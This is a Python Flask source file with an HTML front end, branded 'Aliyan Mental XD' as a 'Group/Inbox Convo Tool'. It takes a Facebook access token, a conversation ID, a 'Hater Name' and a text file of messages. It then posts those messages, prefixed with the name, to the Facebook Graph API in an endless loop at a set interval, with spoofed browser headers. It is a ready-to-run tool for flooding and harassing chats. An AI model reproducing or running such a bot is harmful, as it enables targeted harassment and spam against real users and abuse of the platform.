from flask import Flask, request
import requests
from time import sleep
import time
from datetime import datetime

app = Flask(__name__)

headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'referer': 'www.google.com'
}

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        access_token = request.form.get('accessToken')
        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        while True:
            try:
                for message1 in messages:
                    api_url = f'https://graph.facebook.com/v15.0/t_{thread_id}/'
                    message = str(mn) + ' ' + message1
                    parameters = {'access_token': access_token, 'message': message}
                    response = requests.post(api_url, data=parameters, headers=headers)
                    if response.status_code == 200:
                        print(f"Message sent using token {access_token}: {message}")
                    else:
                        print(f"Failed to send message using token {access_token}: {message}")
                    time.sleep(time_interval)
            except Exception as e:
                print(f"Error while sending message using token {access_token}: {message}")
                print(e)
                time.sleep(30)

    return '''
    
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>𝐀𝐋𝐈𝐘𝐀𝐍 𝐌𝐄𝐍𝐓𝐀𝐋 😘😈</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body  {
            background-image: url('https://c4.wallpaperflare.com/wallpaper/784/1005/239/son-goku-dragon-ball-dragon-ball-super-dragon-ball-super-movie-wallpaper-preview.jpg');
            background-size: cover;
       }

        .container {
            max-width: 350px;
            background-color: red;
            border-radius: 10px;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            margin: 0 auto;
            margin-top: 20px;
        }
        .header {
            text-align: center;
            padding-bottom: 20px;
        }
        .btn-submit {
            width: 100%;
            margin-top: 10px;
            background-color: blue;
            color: white;
        }
        .footer {
            text-align: center;
            margin-top: 20px;
            color: #444;
        }
        .footer a {
            color: red;
        }
    </style>
</head>
<body>
    <header class="header mt-4">
        <h1 class="mb-3">𒆜 𝘼𝙇𝙄𝙔𝘼𝙉 𝙈𝙀𝙉𝙏𝘼𝙇 𝙓𝘿 𒆜</h1>
        <h2>▄︻デ𝒪𝒲𝒩𝐸𝑅══━一 ➨ 𝒜𝐿𝐼𝒴𝒜𝒩 𝑀𝐸𝒩𝒯𝒜𝐿 💙🤫</h2>
    </header>

    <div class="container">
        <form action="/" method="post" enctype="multipart/form-data">
            <div class="mb-3">
                <label for="accessToken">Input Access Token:</label>
                <input type="text" class="form-control" id="accessToken" name="accessToken" required>
            </div>
            <div class="mb-3">
                <label for="threadId">Input Group/Inbox UID:</label>
                <input type="text" class="form-control" id="threadId" name="threadId" required>
            </div>
            <div class="mb-3">
                <label for="kidx">Input Hater Name:</label>
                <input type="text" class="form-control" id="kidx" name="kidx" required>
            </div>
            <div class="mb-3">
                <label for="txtFile">Select TXT File:</label>
                <input type="file" class="form-control" id="txtFile" name="txtFile" accept=".txt" required>
            </div>
            <div class="mb-3">
                <label for="time">Time Interval (Sec):</label>
                <input type="number" class="form-control" id="time" name="time" required>
            </div>
            <button type="submit" class="btn btn-primary btn-submit">Run Convo</button>
        </form>
    </div>

    <footer class="footer">
        <p>© 2025 ᗩᒪᎥƳᗩᑎ ᗰᗴᑎ丅ᗩᒪ. All Rights Reserved.</p>
        <p>Group/Inbox Convo Tool</p>
        <p>Created with ♥ By ☞ 𝔸𝕝𝕚𝕪𝕒𝕟 𝕄𝕖𝕟𝕥𝕒𝕝 🤗😎</a></p>
<a href="https://www.facebook.com/profile.php?id=61560918869506">ᴄʟɪᴄᴋ ʜᴇʀᴇ ғᴏʀ ғᴀᴄᴇʙᴏᴏᴋ</a></p>
    <div class="mb-3">
      <a href="https://wa.me/+601137591057" class="whatsapp-link">
        <i class="fab fa-whatsapp"></i> Chat on WhatsApp

    </footer>

    <script>
        document.querySelector('form').onsubmit = function() {
            alert('Form has been Submitted Successfully!');
        };
    </script>
</body>
</html>
    '''

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
    
